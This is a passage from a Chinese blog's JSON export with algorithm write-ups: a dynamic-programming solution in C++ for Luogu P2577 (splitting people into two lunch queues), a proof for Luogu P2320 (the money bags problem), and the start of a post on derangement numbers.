ACM小组的吃饭计划是这样的：先把所有的人分成两队，并安排好每队中各人的排列顺序，然后一号队伍到一号窗口去排队打饭，二号队伍到二号窗口去排队打饭。每个人打完饭后立刻开始吃，所有人都吃完饭后立刻集合去六教地下室进行下午的训练。\n\n现在给定了每个人的打饭时间和吃饭时间，要求安排一种最佳的分队和排队方案使得所有人都吃完饭的时间尽量早。\n\n假设THU ACM小组在时刻0到达十食堂，而且食堂里面没有其他吃饭的同学（只有打饭的师傅）。每个人必须而且只能被分在一个队伍里。两个窗口是并行操作互不影响的，而且每个人打饭的时间是和窗口无关的，打完饭之后立刻就开始吃饭，中间没有延迟。\n\n现在给定N个人各自的打饭时间和吃饭时间，要求输出最佳方案下所有人吃完饭的时刻。\n\n#### 输入输出格式\n\n输入格式：\n\n第一行一个整数N，代表总共有N个人。\n\n以下N行，每行两个整数 Ai，Bi。依次代表第i个人的打饭时间和吃饭时间。\n\n输出格式：\n\n一个整数T，代表所有人吃完饭的最早时刻。\n\n#### 输入输出样例\n\n输入样例#1：\n\n```\n5\n2 2\n7 7\n1 3\n6 4\n8 5\n\n```\n\n输出样例#1：\n\n```\n17\n```\n\n## 题解\n\n#### 吃饭时间越长越早排队\n\n- 假设有一个最优分组方法，其中第一队内是按吃饭时间长短排序的——越长排在越前。然后尝试交换该队内的某两个人，`i`、`j` ——即原先是`i` 排在`j` 前面，并且两人各自的吃饭时间$b[j]<b[i]$，现在交换过来\n- 首先，交换前从队头到到`j` 总的打饭时间或者是交换后从队头到`i` 的总的打饭时间都是$T$\n- 然后以前$T$时间后，`j` 开始吃饭，现在是$T$时间后，`i` 开始吃饭。如果以前最终吃饭完成的时间是$T+b[j]$ （$b[j]$ 是`j` 的吃饭时间），那么现在就是$T+b[i]>T+b[j]$ 。如果以前最终吃饭完成时间比$T+b[j]$ 后，那么现在最终吃饭完成时间就大于或者等于$T+b[i]$ \n\n#### 如何记录状态以及状态转移方程\n\n- $dp[i][j][k]$ ：表示当排到第`i` 个人时，第一队的排队耗时是`j` ，第二队的排队耗时是`k` \n\n- 先定义符号，$man[i].a$ 表示第`i` 人的打饭时间，$man[i].b$ 是第`i` 人的吃饭时间，$sum[x]=\\Sigma_{i=0}^x man[i].a$\n\n- 因为，对于确定的`i` ，$k=sum[i]-j$ ，所以，$dp[i][j][k]=dp[i][j][sum[i]-j]$ \n\n- ```cpp\n  int x = MAX(dp[i-1][j-man[i].a][k], j+man[i].b);\n  int y = MAX(dp[i-1][j][k-man[i].a], k+man[i].b);\n  dp[i][j][k] = dp[i][j][sum[i]-j] = MIN(x, y);\n  ```\n\n- 之所以要取MAX，是因为$dp[i-1][j-man[i].a][k]$ 可能是第一队达到的最长吃饭完成时间，也可能是第二队达到的，而即使是第一队达到的，也有可能现在第一队最后一个吃完的时间$j+man[i].b$ 比$dp[i-1][j-man[i].a][k]$ 早，所以要取MAX\n\n- 因为无需枚举`k` ，所以无需使用三维数组。并且可以使用滚动数组，从而压缩为一维数组\n\n## 代码\n\n```cpp\n#include <algorithm>\n#include <cassert>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <iostream>\n#include <map>\n#include <queue>\n#include <vector>\n#define FWD(x, b, e) for (int x = b; x < e; x++)\n#define BWD(x, b, e) for (int x = b; x >= e; x--)\n#define INF 0x3f3f3f3f\nusing namespace std;\n\ninline int MAX(int x, int y) { return x < y ? y : x; }\n\ninline int MIN(int x, int y) { return x < y ? x : y; }\n\nstruct Node {\n    int a, b;// a is pick time, b is eat time\n    bool operator<(const Node &y) const { return this->b > y.b; }\n};\nNode man[300];\nint dp[80010];\nint sum[300];\n\nint main() {\n    int n;\n    scanf(\"%d\", &n);\n    for (int i = 0; i < n; i++) {\n        scanf(\"%d%d\", &man[i].a, &man[i].b);\n    }\n    sort(man, man + n);\n\n    sum[0] = man[0].a;\n    FWD(i, 1, n) { sum[i] = sum[i - 1] + man[i].a; }\n    memset(dp, 10, sizeof(dp));\n    dp[0] = man[0].b + man[0].a;\n    dp[man[0].a] = man[0].b + man[0].a;\n    FWD(i, 1, n) {\n        BWD(j, sum[i], 0) {\n            int tmp1 = INF, tmp2 = INF;\n            if (j >= man[i].a) {\n                tmp1 = MAX(dp[j - man[i].a], j + man[i].b);// 第一个人放在1队\n            }\n            if (sum[i] - j >= man[i].a) {\n                tmp2 = MAX(dp[j], sum[i] - j + man[i].b);// 第i个人放在二队\n            }\n            // 如果j只能允许man[i].a放在一队，则i就放一队\n            if (j >= man[i].a && sum[i] - j < man[i].a) {\n                dp[j] = tmp1;\n            }else if (j < man[i].a && sum[i] - j >= man[i].a) {\n                dp[j] = tmp2;\n            }else if (j >= man[i].a && sum[i] - j >= man[i].a) {\n                dp[j] = MIN(tmp2, tmp1);\n            }\n        }\n    }\n    int ans = INF;\n    FWD(i, 0, sum[n - 1] + 1) { ans = ans < dp[i] ? ans : dp[i]; }\n    printf(\"%d\\n\", ans);\n}\n```\n\n- 注意，在枚举$dp[i][j]$ 的`j` 时，要注意该`j ` 是否允许`man[i].a` 放在第一队，或者会放在第二队，所以，给$dp[i][j]$ 赋值时也要注意是否只能放在其中一队，从而直接赋值就行了，如果能放在其中两队，那么就要取MIN\n\n- 注意，此题初始化时不可以把从$man[i].a+1$ 到$sum[n-1]$ 的dp都赋值为$man[i].a+man[i].b$ ，而应该赋值为INF。因为后面进行dp时，枚举$j$ 时，可能出现一种情况$j<man[i].a$ 导致这个j时不可以放在第一队，并且$sum[i]-j<man[i].a$ 导致也不可以放在第二队，这种情况就应该INF。\n\n- 此题如果使用自顶向下应该可以节省一些冗余状态——就是直接把上面的循环改成尾递归\n\n  {% asset_img 1.png %}\n\n- [截图来源 ](https://www.luogu.org/problemnew/solution/P2577)\n\n","content":"<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><h4 id=\"题目描述\"><a href=\"#题目描述\" class=\"headerlink\" title=\"题目描述\"></a>题目描述</h4><p>上午的训练结束了，THU ACM小组集体去吃午餐，他们一行N人来到了著名的十食堂。这里有两个打饭的窗口，每个窗口同一时刻只能给一个人打饭。由于每个人的口味（以及胃口）不同，所以他们要吃的菜各有不同，打饭所要花费的时间是因人而异的。另外每个人吃饭的速度也不尽相同，所以吃饭花费的时间也是可能有所不同的。</p>\n<p>THU ACM小组的吃饭计划是这样的：先把所有的人分成两队，并安排好每队中各人的排列顺序，然后一号队伍到一号窗口去排队打饭，二号队伍到二号窗口去排队打饭。每个人打完饭后立刻开始吃，所有人都吃完饭后立刻集合去六教地下室进行下午的训练。</p>\n<p>现在给定了每个人的打饭时间和吃饭时间，要求安排一种最佳的分队和排队方案使得所有人都吃完饭的时间尽量早。</p>\n<p>假设THU ACM小组在时刻0到达十食堂，而且食堂里面没有其他吃饭的同学（只有打饭的师傅）。每个人必须而且只能被分在一个队伍里。两个窗口是并行操作互不影响的，而且每个人打饭的时间是和窗口无关的，打完饭之后立刻就开始吃饭，中间没有延迟。</p>\n<p>现在给定N个人各自的打饭时间和吃饭时间，要求输出最佳方案下所有人吃完饭的时刻。</p>\n<h4 id=\"输入输出格式\"><a href=\"#输入输出格式\" class=\"headerlink\" title=\"输入输出格式\"></a>输入输出格式</h4><p>输入格式：</p>\n<p>第一行一个整数N，代表总共有N个人。</p>\n<p>以下N行，每行两个整数 Ai，Bi。依次代表第i个人的打饭时间和吃饭时间。</p>\n<p>输出格式：</p>\n<p>一个整数T，代表所有人吃完饭的最早时刻。</p>\n<h4 id=\"输入输出样例\"><a href=\"#输入输出样例\" class=\"headerlink\" title=\"输入输出样例\"></a>输入输出样例</h4><p>输入样例#1：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5</span><br><span class=\"line\">2 2</span><br><span class=\"line\">7 7</span><br><span class=\"line\">1 3</span><br><span class=\"line\">6 4</span><br><span class=\"line\">8 5</span><br></pre></td></tr></table></figure>\n<p>输出样例#1：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">17</span><br></pre></td></tr></table></figure>\n<h2 id=\"题解\"><a href=\"#题解\" class=\"headerlink\" title=\"题解\"></a>题解</h2><h4 id=\"吃饭时间越长越早排队\"><a href=\"#吃饭时间越长越早排队\" class=\"headerlink\" title=\"吃饭时间越长越早排队\"></a>吃饭时间越长越早排队</h4><ul>\n<li>假设有一个最优分组方法，其中第一队内是按吃饭时间长短排序的——越长排在越前。然后尝试交换该队内的某两个人，<code>i</code>、<code>j</code> ——即原先是<code>i</code> 排在<code>j</code> 前面，并且两人各自的吃饭时间$b[j]&lt;b[i]$，现在交换过来</li>\n<li>首先，交换前从队头到到<code>j</code> 总的打饭时间或者是交换后从队头到<code>i</code> 的总的打饭时间都是$T$</li>\n<li>然后以前$T$时间后，<code>j</code> 开始吃饭，现在是$T$时间后，<code>i</code> 开始吃饭。如果以前最终吃饭完成的时间是$T+b[j]$ （$b[j]$ 是<code>j</code> 的吃饭时间），那么现在就是$T+b[i]&gt;T+b[j]$ 。如果以前最终吃饭完成时间比$T+b[j]$ 后，那么现在最终吃饭完成时间就大于或者等于$T+b[i]$ </li>\n</ul>\n<h4 id=\"如何记录状态以及状态转移方程\"><a href=\"#如何记录状态以及状态转移方程\" class=\"headerlink\" title=\"如何记录状态以及状态转移方程\"></a>如何记录状态以及状态转移方程</h4><ul>\n<li><p>$dp[i][j][k]$ ：表示当排到第<code>i</code> 个人时，第一队的排队耗时是<code>j</code> ，第二队的排队耗时是<code>k</code> </p>\n</li>\n<li><p>先定义符号，$man[i].a$ 表示第<code>i</code> 人的打饭时间，$man[i].b$ 是第<code>i</code> 人的吃饭时间，$sum[x]=\\Sigma_{i=0}^x man[i].a$</p>\n</li>\n<li><p>因为，对于确定的<code>i</code> ，$k=sum[i]-j$ ，所以，$dp[i][j][k]=dp[i][j][sum[i]-j]$ </p>\n</li>\n<li><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> x = MAX(dp[i<span class=\"number\">-1</span>][j-man[i].a][k], j+man[i].b);</span><br><span class=\"line\"><span class=\"keyword\">int</span> y = MAX(dp[i<span class=\"number\">-1</span>][j][k-man[i].a], k+man[i].b);</span><br><span class=\"line\">dp[i][j][k] = dp[i][j][sum[i]-j] = MIN(x, y);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>之所以要取MAX，是因为$dp[i-1][j-man[i].a][k]$ 可能是第一队达到的最长吃饭完成时间，也可能是第二队达到的，而即使是第一队达到的，也有可能现在第一队最后一个吃完的时间$j+man[i].b$ 比$dp[i-1][j-man[i].a][k]$ 早，所以要取MAX</p>\n</li>\n<li><p>因为无需枚举<code>k</code> ，所以无需使用三维数组。并且可以使用滚动数组，从而压缩为一维数组</p>\n</li>\n</ul>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cassert&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;map&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> FWD(x, b, e) for (int x = b; x &lt; e; x++)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> BWD(x, b, e) for (int x = b; x &gt;= e; x--)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> INF 0x3f3f3f3f</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">int</span> <span class=\"title\">MAX</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123; <span class=\"keyword\">return</span> x &lt; y ? y : x; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">int</span> <span class=\"title\">MIN</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123; <span class=\"keyword\">return</span> x &lt; y ? x : y; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Node</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> a, b;<span class=\"comment\">// a is pick time, b is eat time</span></span><br><span class=\"line\">    <span class=\"keyword\">bool</span> <span class=\"keyword\">operator</span>&lt;(<span class=\"keyword\">const</span> Node &amp;y) <span class=\"keyword\">const</span> &#123; <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>-&gt;b &gt; y.b; &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">Node man[<span class=\"number\">300</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> dp[<span class=\"number\">80010</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> sum[<span class=\"number\">300</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;man[i].a, &amp;man[i].b);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sort(man, man + n);</span><br><span class=\"line\"></span><br><span class=\"line\">    sum[<span class=\"number\">0</span>] = man[<span class=\"number\">0</span>].a;</span><br><span class=\"line\">    FWD(i, <span class=\"number\">1</span>, n) &#123; sum[i] = sum[i - <span class=\"number\">1</span>] + man[i].a; &#125;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(dp, <span class=\"number\">10</span>, <span class=\"keyword\">sizeof</span>(dp));</span><br><span class=\"line\">    dp[<span class=\"number\">0</span>] = man[<span class=\"number\">0</span>].b + man[<span class=\"number\">0</span>].a;</span><br><span class=\"line\">    dp[man[<span class=\"number\">0</span>].a] = man[<span class=\"number\">0</span>].b + man[<span class=\"number\">0</span>].a;</span><br><span class=\"line\">    FWD(i, <span class=\"number\">1</span>, n) &#123;</span><br><span class=\"line\">        BWD(j, sum[i], <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> tmp1 = INF, tmp2 = INF;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (j &gt;= man[i].a) &#123;</span><br><span class=\"line\">                tmp1 = MAX(dp[j - man[i].a], j + man[i].b);<span class=\"comment\">// 第一个人放在1队</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (sum[i] - j &gt;= man[i].a) &#123;</span><br><span class=\"line\">                tmp2 = MAX(dp[j], sum[i] - j + man[i].b);<span class=\"comment\">// 第i个人放在二队</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 如果j只能允许man[i].a放在一队，则i就放一队</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (j &gt;= man[i].a &amp;&amp; sum[i] - j &lt; man[i].a) &#123;</span><br><span class=\"line\">                dp[j] = tmp1;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (j &lt; man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123;</span><br><span class=\"line\">                dp[j] = tmp2;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (j &gt;= man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123;</span><br><span class=\"line\">                dp[j] = MIN(tmp2, tmp1);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> ans = INF;</span><br><span class=\"line\">    FWD(i, <span class=\"number\">0</span>, sum[n - <span class=\"number\">1</span>] + <span class=\"number\">1</span>) &#123; ans = ans &lt; dp[i] ? ans : dp[i]; &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, ans);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>注意，在枚举$dp[i][j]$ 的<code>j</code> 时，要注意该<code>j</code> 是否允许<code>man[i].a</code> 放在第一队，或者会放在第二队，所以，给$dp[i][j]$ 赋值时也要注意是否只能放在其中一队，从而直接赋值就行了，如果能放在其中两队，那么就要取MIN</p>\n</li>\n<li><p>注意，此题初始化时不可以把从$man[i].a+1$ 到$sum[n-1]$ 的dp都赋值为$man[i].a+man[i].b$ ，而应该赋值为INF。因为后面进行dp时，枚举$j$ 时，可能出现一种情况$j&lt;man[i].a$ 导致这个j时不可以放在第一队，并且$sum[i]-j&lt;man[i].a$ 导致也不可以放在第二队，这种情况就应该INF。</p>\n</li>\n<li><p>此题如果使用自顶向下应该可以节省一些冗余状态——就是直接把上面的循环改成尾递归</p>\n<img src=\"/2018/05/20/洛谷2577-午餐/1.png\">\n</li>\n<li><p><a href=\"https://www.luogu.org/problemnew/solution/P2577\" target=\"_blank\" rel=\"noopener\">截图来源 </a></p>\n</li>\n</ul>\n","slug":"洛谷2577-午餐","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"},{"name":"动态规划","slug":"动态规划","permalink":"https://h-zex.github.io/tags/动态规划/"}]},{"title":"洛谷2320 鬼谷子的钱袋 形式化证明","date":"2018-05-16T17:33:21.000Z","path":"2018/05/17/洛谷2320-鬼谷子的钱袋-形式化证明/","text":"题目描述鬼谷子非常聪明，正因为这样，他非常繁忙，经常有各诸侯车的特派员前来向他咨询时政。 有一天，他在咸阳游历的时候，朋友告诉他在咸阳最大的拍卖行（聚宝商行）将要举行一场拍卖会，其中有一件宝物引起了他极大的兴趣，那就是无字天书。 但是，他的行程安排得很满，他已经买好了去邯郸的长途马车票，不巧的是出发时间是在拍卖会快要结束的时候。于是，他决定事先做好准备，将自己的金币数好并用一个个的小钱袋装好，以便在他现有金币的支付能力下，任何数目的金币他都能用这些封闭好的小钱的组合来付账。 鬼谷子也是一个非常节俭的人，他想方设法使自己在满足上述要求的前提下，所用的钱袋数最少，并且不有两个钱袋装有相同的大于1的金币数。假设他有m个金币，你能猜到他会用多少个钱袋，并且每个钱袋装多少个金币吗？ 输入输出格式 输入格式：包含一个整数，表示鬼谷子现有的总的金币数目m。其中，1≤m ≤1000000000。 输出格式：两行，第一行一个整数h，表示所用钱袋个数。第二行表示每个钱袋所装的金币个数，由小到大输出，空格隔开 输入输出示例12345输入3输出21 2 解法 对于m个待装袋的金币，取$\\lceil m/2\\rceil$ 个金币装入第一个袋子，然后递归求解 证明 对于一个数m，采用每次分割一半的方法，共分割出$\\lfloor lg_2m\\rfloor+1$ 个袋子 按照题意，我们需要给出一个k个元素的序列，这个序列有$2^k$ 种选择元素的方法。每种选择法得出一个值。而因为需要能构造出所有可能的值，也就是要构造出$[0,m]$ 内的所有值，共m+1个值，所以$k\\geq \\lceil lg_2(m+1)\\rceil$ 对于$m\\geq1$，$\\lceil lg_2(m+1)\\rceil= \\lfloor lg_2m\\rfloor+1$ 所以我们的解法已经达到了最优","raw":"---\ntitle: 洛谷2320 鬼谷子的钱袋 形式化证明\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-17 01:33:21\ntags:\n- ACM\n- 数学\n- 递归\ndescription: 题解\ncategories:\n- 算法\n\n---\n\n## 题目\n\n#### 描述\n\n鬼谷子非常聪明，正因为这样，他非常繁忙，经常有各诸侯车的特派员前来向他咨询时政。\n\n有一天，他在咸阳游历的时候，朋友告诉他在咸阳最大的拍卖行（聚宝商行）将要举行一场拍卖会，其中有一件宝物引起了他极大的兴趣，那就是无字天书。\n\n但是，他的行程安排得很满，他已经买好了去邯郸的长途马车票，不巧的是出发时间是在拍卖会快要结束的时候。于是，他决定事先做好准备，将自己的金币数好并用一个个的小钱袋装好，以便在他现有金币的支付能力下，任何数目的金币他都能用这些封闭好的小钱的组合来付账。\n\n鬼谷子也是一个非常节俭的人，他想方设法使自己在满足上述要求的前提下，所用的钱袋数最少，并且不有两个钱袋装有相同的大于1的金币数。假设他有m个金币，你能猜到他会用多少个钱袋，并且每个钱袋装多少个金币吗？\n\n\n#### 输入输出格式\n\n- 输入格式：包含一个整数，表示鬼谷子现有的总的金币数目m。其中，1≤m ≤1000000000。\n\n- 输出格式：两行，第一行一个整数h，表示所用钱袋个数。第二行表示每个钱袋所装的金币个数，由小到大输出，空格隔开\n\n\n#### 输入输出示例\n\n```\n输入\n3\n输出\n2\n1 2\n```\n\n## 解法\n\n- 对于m个待装袋的金币，取$\\lceil m/2\\rceil$ 个金币装入第一个袋子，然后递归求解\n\n## 证明\n\n- 对于一个数m，采用每次分割一半的方法，共分割出$\\lfloor lg_2m\\rfloor+1$ 个袋子\n- 按照题意，我们需要给出一个k个元素的序列，这个序列有$2^k$ 种选择元素的方法。每种选择法得出一个值。而因为需要能构造出所有可能的值，也就是要构造出$[0,m]$ 内的所有值，共m+1个值，所以$k\\geq \\lceil lg_2(m+1)\\rceil$ \n- 对于$m\\geq1$，$\\lceil lg_2(m+1)\\rceil= \\lfloor lg_2m\\rfloor+1$\n- 所以我们的解法已经达到了最优\n","content":"<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><h4 id=\"描述\"><a href=\"#描述\" class=\"headerlink\" title=\"描述\"></a>描述</h4><p>鬼谷子非常聪明，正因为这样，他非常繁忙，经常有各诸侯车的特派员前来向他咨询时政。</p>\n<p>有一天，他在咸阳游历的时候，朋友告诉他在咸阳最大的拍卖行（聚宝商行）将要举行一场拍卖会，其中有一件宝物引起了他极大的兴趣，那就是无字天书。</p>\n<p>但是，他的行程安排得很满，他已经买好了去邯郸的长途马车票，不巧的是出发时间是在拍卖会快要结束的时候。于是，他决定事先做好准备，将自己的金币数好并用一个个的小钱袋装好，以便在他现有金币的支付能力下，任何数目的金币他都能用这些封闭好的小钱的组合来付账。</p>\n<p>鬼谷子也是一个非常节俭的人，他想方设法使自己在满足上述要求的前提下，所用的钱袋数最少，并且不有两个钱袋装有相同的大于1的金币数。假设他有m个金币，你能猜到他会用多少个钱袋，并且每个钱袋装多少个金币吗？</p>\n<h4 id=\"输入输出格式\"><a href=\"#输入输出格式\" class=\"headerlink\" title=\"输入输出格式\"></a>输入输出格式</h4><ul>\n<li><p>输入格式：包含一个整数，表示鬼谷子现有的总的金币数目m。其中，1≤m ≤1000000000。</p>\n</li>\n<li><p>输出格式：两行，第一行一个整数h，表示所用钱袋个数。第二行表示每个钱袋所装的金币个数，由小到大输出，空格隔开</p>\n</li>\n</ul>\n<h4 id=\"输入输出示例\"><a href=\"#输入输出示例\" class=\"headerlink\" title=\"输入输出示例\"></a>输入输出示例</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输入</span><br><span class=\"line\">3</span><br><span class=\"line\">输出</span><br><span class=\"line\">2</span><br><span class=\"line\">1 2</span><br></pre></td></tr></table></figure>\n<h2 id=\"解法\"><a href=\"#解法\" class=\"headerlink\" title=\"解法\"></a>解法</h2><ul>\n<li>对于m个待装袋的金币，取$\\lceil m/2\\rceil$ 个金币装入第一个袋子，然后递归求解</li>\n</ul>\n<h2 id=\"证明\"><a href=\"#证明\" class=\"headerlink\" title=\"证明\"></a>证明</h2><ul>\n<li>对于一个数m，采用每次分割一半的方法，共分割出$\\lfloor lg_2m\\rfloor+1$ 个袋子</li>\n<li>按照题意，我们需要给出一个k个元素的序列，这个序列有$2^k$ 种选择元素的方法。每种选择法得出一个值。而因为需要能构造出所有可能的值，也就是要构造出$[0,m]$ 内的所有值，共m+1个值，所以$k\\geq \\lceil lg_2(m+1)\\rceil$ </li>\n<li>对于$m\\geq1$，$\\lceil lg_2(m+1)\\rceil= \\lfloor lg_2m\\rfloor+1$</li>\n<li>所以我们的解法已经达到了最优</li>\n</ul>\n","slug":"洛谷2320-鬼谷子的钱袋-形式化证明","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"},{"name":"数学","slug":"数学","permalink":"https://h-zex.github.io/tags/数学/"},{"name":"递归","slug":"递归","permalink":"https://h-zex.github.io/tags/递归/"}]},{"title":"组合数之错排数","date":"2018-05-14T13:51:56.000Z","path":"2018/05/14/组合数之错排数/","text":"错排数的定义 假设有n个元素，n个位置，每个元素都有自己唯一的正确位置，问，所有元素都处在错误位置有多少可能 递推公式 设$f(n)$ 表示n个元素的错排种数，则$f(n+1)=n*(f(n)+f(n-1))$ 解释如下 假设已经有n个元素错排，新来一个元素，那么该元素处于已有的n个元素的位置都可以实现错排，所以有$n*f(n)$ 种可能 假设已有n个元素，其中n-1个是错排的，另外一个是正确的，这种情况有n种。新来一个元素，这个元素唯有跟那个正确元素交换位置才可以实现n+1个元素的错排。所以有$n*f(n-2)$ 种可能 为什么没有其他可能？ 因为对于n+1个元素的某个错排来说，假设第$n+1$个元素处于第i位($i\\neq n+1$)，然后第$n+1$个位置有第k个元素，那么要么$k=i$ 或者$k\\neq i$ ，没有其他可能情况 ACM题 hdu2049","raw":"---\ntitle: 组合数之错排数\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-14 21:51:56\ntags:\n- 组合数\n- 错排\n- ACM\ndescription: n个元素都不在自己的位置上，有多少种可能\ncategories:\n- 数学\n\n---\n\n## 错排数的定义\n\n- 假设有n个元素，n个位置，每个元素都有自己唯一的正确位置，问，所有元素都处在错误位置有多少可能\n\n## 递推公式\n\n- 设$f(n)$ 表示n个元素的错排种数，则$f(n+1)=n*(f(n)+f(n-1))$ \n- 解释如下\n  - 